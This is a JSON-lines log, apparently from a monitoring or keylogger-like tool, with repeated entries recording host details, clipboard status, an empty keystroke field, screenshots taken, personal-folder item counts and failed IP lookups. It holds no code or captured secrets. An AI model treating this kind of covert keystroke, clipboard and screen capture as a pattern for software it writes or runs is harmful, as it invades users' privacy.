{"timestamp": "2025-06-14T07:06:44.698898+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "75ef7b67169f608963d74f8e4d3c1032ab6e4d3fd7e3d938614140c6a8c7606c", "_raw_log_hash": "74bd9dabeb6be3ee3bd6d295395ccecc7ac3967432bdb483b3a1ad22bf40080b"}
{"timestamp": "2025-06-14T07:06:58.237635+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b3c08ecd77748123ec68dba6c8efe1e15a8e1f3fe3814e89541a47acdbba46c0", "_raw_log_hash": "b2378eabd5a05ff049ddcd4a947dce4f7245fc9d08d59234bf4fa267d547880a"}
{"timestamp": "2025-06-14T07:07:11.767164+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "18d44f8a11cdbe3c0b9c5f3d622883036eb068937741d990ced6d0ab41dbf897", "_raw_log_hash": "08ba0dd708ec592f5a5459dbb4d3e6627b5a02520a79531a4b3ac455da3ff36f"}
{"timestamp": "2025-06-14T07:07:25.280881+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8c8ef7db0863cad63a2dd4fa9d32a5072075327d53bae9b4cf6f29a3fd4cafe5", "_raw_log_hash": "f9172489d9b25dda65ff4d5d6712856a266ea2d5a856f1e6f916d030cc454f98"}
{"timestamp": "2025-06-14T07:07:38.794615+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "89885f663306b8c62232b7eec0ac604a0137a778e2ed6d054803f4f1764b6386", "_raw_log_hash": "fe571a85ed2939de1ff3856aa93c46d38d24446198a269c0ef699bc438f98d3a"}
{"timestamp": "2025-06-14T07:07:52.249625+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fca208578d9866b14cd849b717801b27b2c872dfb235dd9180e3807a8c961699", "_raw_log_hash": "809f68889f9bc475c704fef31ae7902127a7fbc7171887db71199d82f3225f77"}
{"timestamp": "2025-06-14T07:08:05.735104+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d3d223772c86c88cf3c08e27996908dc123d0e7d190323d6d0a9c4227be699b0", "_raw_log_hash": "be28525e1878a42073a8497de373db8e02065b08d44de4874b0dcd67cf30e7cb"}
{"timestamp": "2025-06-14T07:08:19.342681+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6198ae3381137fb066aed43da156611d71e76205f4b2678bc1e28ec490b53f20", "_raw_log_hash": "37c5ef3115f914e85bcbb5e5bde687ccabcff7f5f4d37d9d585e8f5a46b968a9"}
{"timestamp": "2025-06-14T07:08:32.878447+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5b2d4604ed31e34079e87fda4b164d6769482aac3ef7ab9c9571b1810a3300f1", "_raw_log_hash": "dba8c1ba3c3519958ff43c0e06b114f32dabf395a87c01ada7aaa216daa6e8db"}
{"timestamp": "2025-06-14T07:08:46.403086+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b735d12a9feaa217f46fbec3a5476b09f388de672abc13c74884d8f9ced98e2e", "_raw_log_hash": "71a972095e7ffd70da8f5c07251265c8ec55ca0630b512e763921b8ee49fd94e"}
{"timestamp": "2025-06-14T07:08:59.971753+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D310>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7d5bc7fe600a5767de92973ac0a8af4905dd5df6fe7fea70340d627a382d35e7", "_raw_log_hash": "2f561dfac7e57031d39e0b30589b5584aacc454bbab7f23c215692912e91bba5"}
{"timestamp": "2025-06-14T07:09:13.593749+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "af5b74824f6d6d7b2555016deb2a7444b4e9adf99934a4d1b92fdbe1a1eba7ae", "_raw_log_hash": "59b20e801ef54ca989bcafd4962eda689a01a8c0117c782f2326364ee2a941a2"}
{"timestamp": "2025-06-14T07:09:27.148091+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4c7d3e05ae7f7052d71b71713f34cb93ec585f6662e4b066b6f180a75619ba33", "_raw_log_hash": "53c32e6fd191b1892325756dc9c57b42f8a577123eb08b0b1b30be29add2651b"}
{"timestamp": "2025-06-14T07:09:40.735831+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "29ae56bca4cb29ae172b7c0c22cf5e25e4c96dfb96f6b1a90ae06683d7c8db46", "_raw_log_hash": "c9d083ebcce7650651302968ca83c5e089e6078a9263ba7772a9bcf4e9430c53"}
{"timestamp": "2025-06-14T07:09:54.409512+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c2a566f10ab72093bd79d4b85e35823df55ed7f87659e7fe0909a84bf4917b05", "_raw_log_hash": "394fbae6ef24d9393a3fc50bd746bcce3602f0966789c32b0be1b127c233cd3d"}
{"timestamp": "2025-06-14T07:10:07.879305+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b8582aed54abed46181bbdbe0dd472167d33941292ca7025ea4ea0ac242646df", "_raw_log_hash": "2bea2bc3eae97817f2b78855aa5e85d49afb13c4391495de6367b0ac712dceaf"}
{"timestamp": "2025-06-14T07:10:21.405252+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2e47955f0f63b4df49eccf29f58f3b235f71208072d31a0085cab4e8163948f7", "_raw_log_hash": "159e70e1caff5cd1d9c57e2a9da7f65297ed30481de6f4255bf4f19c49c2767e"}
{"timestamp": "2025-06-14T07:10:34.942607+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b78335b326775280c2d1b45ccddf9ff155fd006b0de098cf626cb0052c95a316", "_raw_log_hash": "25faffb9709f408c8c95ecf540a2a2c9751aa4ddd18817da1f65e79ca751120d"}
{"timestamp": "2025-06-14T07:10:48.866173+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9d996078a0d97cfa3d25dea964f97efffa1b5f7d2bbedd974a87d9ed66adaaee", "_raw_log_hash": "ddcc61d2ec6c4e44c6f563612acf52c23e58c4cf96b0f4c4376d7e2d752b6e96"}
{"timestamp": "2025-06-14T07:11:02.414675+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2ad1f3a83eadb197c4ad7fb66f146537579519bdbe42795c970f285b3d306db9", "_raw_log_hash": "d14ac2b2075cf1d0ca0d01333b8c8724291157c3febffc5714a67edea43a6a5f"}
{"timestamp": "2025-06-14T07:11:15.934981+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D310>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8593e6f5606fefb8cfc7a003e600c47021ac33acd729a839512ad3a881f36112", "_raw_log_hash": "58d33e61a01aa11d87817bbe38c62fba81880aed10466c72196580d70cfc7cc2"}
{"timestamp": "2025-06-14T07:11:29.459772+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8528bb9288a6251cb83a40a7383b04e4fd980a1eef81c328338827abc15eba05", "_raw_log_hash": "14013986e2e1dc244836813b9f9e5ecf6988fe72d0406fb0adad696e786514e5"}
{"timestamp": "2025-06-14T07:11:42.916429+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dce74214d23f441f50f4845e08ce93e0d33da2c8e60a13356d4a13a0e41574ed", "_raw_log_hash": "1851bb98f185764b54d7c5369b5818d98d414789d77efcb96db5a3b43bbc4065"}
{"timestamp": "2025-06-14T07:11:56.439299+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5a7cff269ee43403b9724d3c5e699dbd62eec0ccd04cf30b7cbc482856548b94", "_raw_log_hash": "fe4854bec3f508aab0f6162fa74977d99db2803d79be19f4b5a317d9759aadc3"}
{"timestamp": "2025-06-14T07:12:10.093716+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d07040a28d2e35f774efb936db38475200c9dd60cb63fcb923df3e9869722b56", "_raw_log_hash": "6af6591d15c197d4a32247eb30ffab50f0e59b74a67c988264e06d96547c8a97"}
{"timestamp": "2025-06-14T07:12:23.669649+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3e6c7f395f6bef6cb5376d9394dce72ed658e69a1205d31dc203fb4c10b6d1c5", "_raw_log_hash": "c144662d054fe4dca50dd4646ec6bacec2939fc1ec179d056ca7b73417a45b6f"}
